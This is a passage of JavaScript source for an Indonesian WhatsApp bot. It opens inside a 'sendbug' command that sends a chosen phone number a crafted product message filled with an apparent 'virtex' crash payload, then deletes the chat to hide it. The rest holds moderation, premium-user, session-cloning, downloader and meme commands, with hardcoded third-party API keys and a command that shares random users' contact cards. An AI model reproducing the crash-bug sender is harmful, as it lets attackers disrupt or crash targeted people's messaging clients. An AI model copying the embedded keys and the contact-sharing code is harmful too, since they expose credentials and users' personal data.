if(!q) return setReply("Masukan nomer target")
if (!isOwner) return onlyOwner()
{
reply("*Mengirim Bug Ke Target...!!*")
if (args[0] == '08') return setReply('Awali nomor dengan 62')

if(q.endsWith("@g.us")){
var woke = q
} else {
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
}
hmm4 = fs.readFileSync('./stik/fake.jpeg'),
imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
imeg = imeu.message.imageMessage
res = await xdev.prepareMessageFromContent(woke, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': '',
'title': virtex8(prefix),
'description': virtex8(prefix),
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `0@s.whatsapp.net`,
'contextInfo': forward
}
}, {
contextInfo: forward
}), 
await xdev.relayWAMessage(res)
teks =`Sukses sendbug ke nomer ${woke.split("@")[0]}`

let aklo = [
{"buttonId": `${prefix}sendbug ${q} `,"buttonText": {"displayText": `sᴇɴᴅ ʟᴀɢɪ`},"type": "RESPONSE"},
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}
]
await sendButMessage(from, teks, copyright, aklo)
await xdev.modifyChat(woke, ChatModification.delete)
console.log("*Done Kak!!*")
}
break;
           
           

           
           
           
           case 'setprefix':
           case 'setpref':
                     if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Masukkan prefix\nOptions :\n=> multi`)
                if (c === 'multi'){
                    multi = true
                    nopref = false
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else if (c === 'nopref'){
                	multi = false
                    nopref = true
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                }
                break
                
           

      
      
      
      
  
      
      
           
		case 'ban':
		case 'banned':
		    if (!isGroupAdmins && !isOwner)return setReply('*Hanya Admin Dan Owner!!*')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('*Reply Atau Tag Targetnya!!*')
			          
		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
           nama = xdev.contacts[asu] != undefined ? xdev.contacts[asu].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[asu].notify || xdev.contacts[asu].vname : PhoneNumber('+' + asu.replace('@s.whatsapp.net', '')).getNumber('international')
            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
            if(cekBannedUser (asu, ban)) return setReply("Udah di ban kak")
            if(Nomer === ownerNumber[0]) return setReply("Ga mau")
            addBanned(nama,calender,  Nomer, ban)               
            setReply( `*Yahahaha Si Udin Petot @${asu.split("@")[0]} Kena Banned 🤣*`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('*Hanya Admin Dan Owner!!*')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)
            nama = xdev.contacts[mentioned] != undefined ? xdev.contacts[mentioned].notify = undefined ? PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[mentioned].notify || xdev.contacts[mentioned].vname : PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international')
            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(cekBannedUser (ahah, ban)) return setReply("Udah di ban kak")     
            addBanned(nama, calender, ahah, ban)  
            setReply(`*Asik Si Udin Petot @${mentioned[0].split('@')[0]} Kena Banned 🤣*`);
            }
            break
                  
    
    

            
            
            
            
            
			case 'unbanned':
			case 'unban': //PERCOBAA
		    if (!isGroupAdmins && !isOwner)return setReply('*Hanya Admin Dan Owner!!*')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant           
            if(!cekBannedUser (asu, ban)) return setReply("Udah di unban")
            unBanned (asu, ban)             
            setReply( `*Ciee Si Petot Di Unban, Lain Kali Jan Spam Ya Tot 🙂* @${asu.split("@")[0]}`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('*Hanya Admin Dan Owner!!*')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)    
            lala = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(!cekBannedUser (lala, ban)) return setReply("Udah di unban")        
            unBanned(lala, ban) 
            setReply(`*Ciee Si Petot Di Unban, Lain Kali Jan Spam Ya Tot 🙂* @${mentioned[0].split('@')[0]}`);
            }
            break    
         



           
           
           
           
     
	case 'setfakeimg':
    if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
			delb = await xdev.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			setReply(`Berhasil mengubah fake image`)
        	} else {
            setReply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
			
			
		case 'setthumb':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          setReply(`Berhasil mengubah thumbnail`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
			
           

        
        
        case 'setimagereply':
        case 'setimgreply':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/reply.jpg`, delb);
          setReply(`Berhasil mengubah image reply`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
        }
        break;
        
        
        case 'setimageinfo':
        if (!dev.key.fromMe && !isOwner) return setReply(mess.owner)
        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
          delb = await xdev.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/bot.jpg`, delb);
          setReply(`Berhasil mengubah image pada infobotz`)
        } else {
          setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
        }
        break;
           
           

				
				
				
				

				
				
			      
           
      case 'addbadword':
                if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
                if (args.length < 1) return setReply(`masukkan kata`)
                if (isKasar(q, badword)) return setReply(`Udah ada`)
                addBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'delbadword':
                 if (!isGroupAdmins && !isOwner) return setReply('hanya admin dan owner') 
                if (args.length < 1) return setReply(`masukkan kata`)
                if (!isKasar(q, badword)) return setReply(`Ga ada`)
                delBadword(q, badword)
                setReply(`Sukses`)
                break
            case 'clearbadword':
                if (!isOwner) return onlyOwner() 
                if (args.length < 1) return setReply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    setReply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    setReply('Sukses')
                }
                break




    

    

case 'antichatbot':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(chatBot === true) return setReply("Udah aktif")
                    chatBot = true
					setReply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(chatBot === false) return setReply("Sudah mati")
                    chatBot = false
					setReply(`Berhasil mematikan Antichatbot`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                











case 'anticall':
                if (!isOwner) return onlyOwner()
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                  if(Anticall === true) return setReply("Udah aktif")
                    Anticall = true
					setReply(`Sukses mengaktifkan Anticall`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                   if(Anticall === false) return setReply("Sudah mati")
                    Anticall = false
					setReply(`Berhasil mematikan Anticall`)
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
   


              
                 
    
case 'jadibot':
case 'jadilonte':
if (!isOwner) return  setReply("Harus ijin owner")
setReply(mess.wait)
client.version = [2, 2143, 3]
client.browserDescription = ['EXTREAM','Ubuntu','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await client.loadAuthInfo(obj)
}
try {
client.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await new Buffer.from(qrbot.replace('data:image/png;base64,', ''), 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await xdev.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : dev,caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'})    
setTimeout(() => {
xdev.deleteMessage(from, scen.key)
}, 30000);
})  
client.on ('open', async () => {
console.log ('credentials update')
const authInfo = client.base64EncodedAuthInfo()
fs.writeFileSync(`./${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)

client.on("group-update", async (anu) => {
require('./message/group-settings.js')(client, anu)
});
client.on('group-participants-update', async (anu) => {
require('./message/group.js')(client, anu)
});
client.on("CB:action,,battery", json => {
const baterai2 = {
battery: "" || "Belom Terdeteksi",
isCharge: "Sedang di cas" || "Tidak di cas"
}
const battery = json[2][0][1].value
const persenbat2 = parseInt(battery)
baterai2.battery = `${persenbat2}%`
baterai2.isCharge = json[2][0][1].live
})})
client.on('chat-update', async (chat) => {
require('./index.js')(client, chat, baterai2)
})    
await client.connect().then(async ({user}) => {
listjadibot1.push(client.user)
setReply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
})
} catch {
setReply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
}
break
           
           
           case 'stopjadibot':
if (!isOwner && !dev.key.fromMe) return setReply("tidak bisa stopjadibot kecuali owner")
try {
fs.unlinkSync(`./${sender}.json`)
fs.unlinkSync(`./jadibot@${sender}.jpg`)
client.close()
} catch {
setReply('Done')
client.close()
}
break
	
	
              
              
              

              
             
             
              



	
	case 'premium':
	case 'prem':
	case 'addprem':
	       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')  
if(args.length > 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
if(args.length < 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
nomor = args[0] + `@s.whatsapp.net`              
if(_prem.checkPremiumUser (nomor, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (nomor, args[1], premium)         
await setReply(`Succes add premium ${nomor}`)
await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
premnih = dev.message.extendedTextMessage.contextInfo.participant
if (!isGroup) return setReply("Hanya bisa di group")
if(args.length < 1) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
 if(_prem.checkPremiumUser (premnih, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (premnih, q, premium)         
 await setReply(`Succes add premium ${premnih.split("@")[0]}`)
await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if(args.length < 2) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
 if(_prem.checkPremiumUser (lulu, premium)) return setReply("User tersebut sudah di premium kak")   
_prem.addPremiumUser (lulu, args[1], premium)         
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
   } else{
 setReply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
 }
break    
	
	
	
  
         
case 'delprem':
case 'delpremium':
       if (!isOwner) return onlyOwner()
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply("Penggunaan : delprem Tag/Reply/Input nomer target yang mau di jadikan premium")
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
if(args[3]) return setReply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
nomor = args[0] + `@s.whatsapp.net` 
if(!_prem.checkPremiumUser (nomor, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
          _prem.delPremiumUser (nomor, premium)
          return setReply(`Succes delete premium ${nomor}`)
          
 } else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
premnih = dev.message.extendedTextMessage.contextInfo.participant
if(args.length > 0) return setReply("Format salah")
if(!_prem.checkPremiumUser (premnih, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
 _prem.delPremiumUser (premnih, premium) 
  await setReply(`Succes delete premium  ${premnih.split("@")[0]}`)
  
} else if(dev.message.extendedTextMessage.contextInfo.mentionedJid) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if(mentioned.length > 1) return setReply("Satu satu kak")
	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
	if(!_prem.checkPremiumUser (lulu, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
_prem.delPremiumUser (lulu, premium) 
await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
 }
break    
	
          
          
                 


 
                  
                  
         
	
	
	
	
	

					
	
	
//-------------------------------》FITUR PREMIUM《-------------------------------\\       
	
	
case 'cariteman':
case 'caridoi':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
	//const namanya = xdev.contacts[teman] != undefined ? xdev.contacts[teman].vname || xdev.contacts[teman].notify : undefined
	          
 teman = user[Math.floor(Math.random() * user.length)]
 namaTeman = teman.name
 nomerTeman = teman.id
	setTimeout( () => {
                    setReply("*Sedang Mencari....!!*")
                    },1000)  
	setTimeout( () => {
                    setReply("*Berhasil Mendapatkan Satu Doi!!*")
                    },5000)  
    setTimeout( () => {           
    sendKontak(from, `${nomerTeman}`, namaTeman, "Sibuk");
                    },9000)  
    break
	
	
	
	
	
	

	
	
//-----------------------------------] Menu Download [-----------------------------------//
	
/*
    otakudesu,
	covid,
	ongoing,
	komiku,✓
	tebakgambar,
	surah,
	sholat,
	lirik,
	chara,✓
	wattpad,
	playstore,✓
	linkwa,✓
	pinterest,✓
	igdl,✓
	igstory,✓
	igstalk,✓
	twitter,✓
	fbdown,✓
	youtube,
	ttdownloader✓
         -ttaudio
         -ttwm✓
         -ttnowm✓
*/





             
            
            
            

case 'lirik':
try{
            if(!q) return setReply('*Lagu apa?*')
            if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
            let song = await hx.lirik(q)
            console.log(song)
            musik = song.lirik
            if(`${musik}` === "undefined" ) return setReply("*Gak Ketemu Om!!*")
            foto = await getBuffer(song.thumb)
            liriknya = song.lirik
            let oket = [{
										"buttonId": `${prefix}play ${q}`,
										"buttonText": {
											"displayText": `ʏᴏᴜᴛᴜʙᴇ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, liriknya, `\n© ${fake1}\n${week} , ${calender}`, foto, oket, {contextInfo: forward})
										
            } catch (err){
            	console.log(err)
            	setReply("*Wuanjir Error, Coba Lirik Lain!!*")
   
            }
            break






	
	
	
	
	case 'igstory': 
            if(!q) return setReply('Usernamenya?')
            pape = q
            hx.igstory(pape)
           .then(async result => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            xdev.sendMessage(from,link,video,{quoted: dev,caption: `${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            xdev.sendMessage(from, link, image,{quoted: dev,caption: `${i.type}`})                  
            }
            }
            });
            break
           
    
	

	
	

                      


                      

case 'tiktok':        
if (args.length < 1) return setReply('*Linknya Mana Kak?*')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("*Error link coba lagi!!*")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("*Masukan Link Tiktok, Contoh : https://vt.tiktok.com/*")
}
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
hx.ttdownloader(lin).then(res => {
console.log('*Wait Sedang Download...!!*')
ep = res.wm                     
sendFileFromUrl(ep, video, {quoted: dev, caption: "*Done kak!!*"})
})
break
                      
case 'tiktokmusik':        
case 'tiktokaudio':        
if (args.length < 1) return setReply('*Linknya Mana Kak?*')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("*Error Link Coba Lagi!!*.")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("*Masukan Link Tiktok, Contoh : https://vt.tiktok.com/*")
}
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
hx.ttdownloader(lin).then( async res => {
console.log('*Wait Sedang Download...!!*')
ep = res.wm                     
nana = await getBuffer(ep)
ran = getRandom('.mp3')
ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
fs.unlinkSync(ran)
})
 })
 break
                                       
case 'tiktoknowm':     
try{   
if (args.length < 1) return setReply('*Linknya Mana Kak?*')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply(aml.Iv)
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("*Masukan Link Tikok, Contoh : https://vt.tiktok.com/*")
}
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
hx.ttdownloader(lin).then(res => {
console.log('*Wait Sedang Download...!!*')
ep = res.nowm                     
sendFileFromUrl(ep, video, {quoted: dev, caption: "*Done kak!!*"})
})
} catch (err){
setReply(`${err}`)
}
break


case 'ig':
setReply(mess.wait)
if (!q) return setReply('*Linknya?*')
igreel = q.includes("https://www.instagram.com/reel/")
igstories = q.includes("https://instagram.com/stories/")

if(igreel){
Download.insta_reel(q).then(async (data) => {
sendFileFromUrl(`${data.url}`, video, {quoted: dev, caption: `Nih`})
console.log(data)
console.log(data.url)
})
} else if(igstories){
Download.insta_story(q).then(async (data) => {
	console.log(data)
 //sendFileFromUrl(`${data.stories.url}`, video, {quoted: dev, caption: `Nih`})
})
} else {
var { igDownloader } = require('./lib/igdown')
   res = await igDownloader(`${q}`).catch(e => {
return setReply(mess.error.api)
})
console.log(res)
sendFileFromUrl(`${res.result.link}`, video, {quoted: dev, caption: `${res.result.desc}`})
}
break
                   
                   

   
   

        
	
    case 'igstalk':
		try{
		            if (!q) return fakegroup('*Usernamenya?*')
		            if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })} catch (err){
			console.log(err)
			setReply("Aduh error om")
			}
        break;      
	
 case 'quotesimage':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/quotesimage?apikey=d16af494a6d7bd0fc1cf55a1`,  {method: 'get'}) 
await xdev.sendMessage(from, get_result, image, { quoted: dev, caption: "*Done Kak!!*" })
break

case 'katabijak':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/katabijak?apikey=d16af494a6d7bd0fc1cf55a1`)
reply(`*──❒ Kata Bijak ❒──*\n\n${anu.result}`)
break

 case 'alquranaudio':
if (args.length == 0) return reply(`Nomor Surah Yg Mau Dicari Mana\n*Contoh :* ${prefix}alquranaudio 2/24 atau ${prefix}alquranaudio 18/10`)
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
surah = args[0]
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=d16af494a6d7bd0fc1cf55a1`)
await xdev.sendMessage(from, ini_buffer, audio, { quoted: dev, mimetype: Mimetype.mp4Audio })
break

case 'memegenerator': case 'memegen':{
									if (args.length < 1) return reply(`*Ketik* ${prefix}memegen teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`*Ketik** ${prefix}memegenteks atas|teks bawah`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										setReply(mess.wait)
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
									   var mediiia = await xdev.downloadMediaMessage(enmedia)
										var njay = await uploadImages(mediiia)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay}`)
										xdev.sendMessage(from, resu, image, {caption:'Jadiin sticker cuy From : iMystBot', thumbnail: Buffer.alloc(0), quoted: dev})
										fs.unlinkSync(mediiia)
										} catch (e) {
											console.log(e)
										}
										}
									break
					 	case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':{
						if (args.length < 1) return reply(`*Ketik* ${prefix}smeme iMystBot`)
									if (q.includes('|')) return reply(`*Ketik* ${prefix}smeme iMystBot`)
									try {
										if (!isQuotedImage) return reply(`Reply Gambar!`)
										setReply(mess.wait)
										var teks2 = args.join(' ')
										var enmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
										var mediia = await xdev.downloadMediaMessage(enmedia)
										var njay = await uploadImages(mediia)
										var resu = `https://api.memegen.link/images/custom/-/${teks2}.png?background=${njay}`
										sendStickerFromUrl(from,`${resu}`)	
										} catch (e) {
											console.log(e)
										}
										}
									break	
case 'randommeme':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
get_result = await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=d16af494a6d7bd0fc1cf55a1`,  {method: 'get'}) 
await xdev.sendMessage(from, get_result, image, { quoted: dev, caption: "*Done Kak!!*" })
break

case 'memeindo':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
